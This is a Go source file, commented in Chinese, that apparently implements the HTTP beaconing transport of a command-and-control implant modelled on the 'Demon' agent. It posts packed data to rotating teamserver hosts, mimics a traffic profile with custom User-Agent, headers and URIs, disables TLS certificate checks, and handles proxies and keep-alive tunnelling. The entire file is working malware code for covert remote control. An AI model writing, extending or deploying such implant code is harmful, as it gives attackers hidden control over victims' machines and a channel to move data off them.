package main

import (
	"bytes"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

// transport 负责把原始包 POST 到监听器，并取回响应字节。
// 与 Windows Demon 的 WinHTTP 链路等价：POST + profile 里的 UA/Headers/URI。

var (
	httpClient *http.Client
	hostIdx    int
	rrMu       sync.Mutex
)

func initTransport() {
	proxy := http.ProxyFromEnvironment
	cfg := cfg()
	if cfg.ProxyEnabled && cfg.ProxyHost != "" {
		scheme := cfg.ProxyType
		if scheme == "" {
			scheme = "http"
		}
		proxyURL := &url.URL{
			Scheme: scheme,
			Host:   fmt.Sprintf("%s:%d", cfg.ProxyHost, cfg.ProxyPort),
		}
		if cfg.ProxyUsername != "" {
			proxyURL.User = url.UserPassword(cfg.ProxyUsername, cfg.ProxyPassword)
		}
		proxy = http.ProxyURL(proxyURL)
	}

	tr := &http.Transport{
		Proxy: proxy,
		DialContext: (&net.Dialer{
			Timeout:   15 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		TLSClientConfig:       &tls.Config{InsecureSkipVerify: true}, // 自签名证书
		TLSHandshakeTimeout:   15 * time.Second,
		ResponseHeaderTimeout: 30 * time.Second,
		MaxIdleConns:          4,
		IdleConnTimeout:       60 * time.Second,
	}
	httpClient = &http.Client{Transport: tr, Timeout: 60 * time.Second}
}

func nextHost() HostPort {
	cfg := cfg()
	rrMu.Lock()
	defer rrMu.Unlock()

	if len(cfg.Hosts) == 0 {
		return HostPort{Host: "127.0.0.1", Port: 8080}
	}
	if strings.EqualFold(cfg.HostRotation, "random") {
		return cfg.Hosts[rand.Intn(len(cfg.Hosts))]
	}
	h := cfg.Hosts[hostIdx%len(cfg.Hosts)]
	hostIdx++
	return h
}

func nextURI() string {
	cfg := cfg()
	if len(cfg.Uris) == 0 {
		return "/"
	}
	return cfg.Uris[rand.Intn(len(cfg.Uris))]
}

func postPackage(body []byte) ([]byte, error) {
	cfg := cfg()
	if httpClient == nil {
		initTransport()
	}
	host := nextHost()
	scheme := "http"
	if cfg.Secure {
		scheme = "https"
	}
	hostport := host.Host
	if host.Port > 0 {
		hostport = fmt.Sprintf("%s:%d", host.Host, host.Port)
	}
	url := fmt.Sprintf("%s://%s%s", scheme, hostport, nextURI())

	method := cfg.Method
	if method == "" {
		method = "POST"
	}
	req, err := http.NewRequest(method, url, bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	// teamserver 的 PortFwdRead 已改为分块流式：rportfwd 隧道会立即把对端的
	// 每个数据块推给下一跳，不再依赖连接关闭。因此这里保持 HTTP keep-alive，
	// 多跳链路可以复用连接（心跳不必每次重新握手）。

	if cfg.UserAgent != "" {
		req.Header.Set("User-Agent", cfg.UserAgent)
	}
	for _, h := range cfg.Headers {
		parts := strings.SplitN(h, ":", 2)
		if len(parts) == 2 {
			req.Header.Set(strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]))
		}
	}

	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		io.Copy(io.Discard, resp.Body)
		return nil, fmt.Errorf("unexpected status: %d", resp.StatusCode)
	}
	out, err := io.ReadAll(io.LimitReader(resp.Body, 64*1024*1024))
	if err != nil {
		return nil, err
	}
	if os.Getenv("DEMON_DEBUG") != "" {
		log.Printf("POST %s -> %d (%d bytes sent, %d bytes received)", url, resp.StatusCode, len(body), len(out))
	}
	if len(out) == 0 {
		return nil, errors.New("empty response")
	}
	return out, nil
}
